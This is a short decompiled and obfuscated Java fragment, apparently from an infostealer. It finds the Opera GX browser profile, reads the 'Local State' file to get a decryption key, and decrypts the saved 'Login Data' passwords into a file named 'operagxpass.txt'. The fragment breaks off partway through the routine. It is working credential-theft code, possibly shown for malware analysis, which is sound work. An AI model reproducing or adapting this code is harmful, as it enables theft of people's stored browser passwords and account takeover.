...
public class 0f {
   ...
   private static final String 1 = System.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable";
   ...
   private void _/* $FF was: 1*/() {
      ...
      byte[] key = this.0(new File(System.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Local State"));
      if (key != null) {
         File loginData = new File(userData, "Login Data");

         try {
            if (loginData.exists()) {
               this.0(loginData, key, "", "operagxpass.txt");
            }
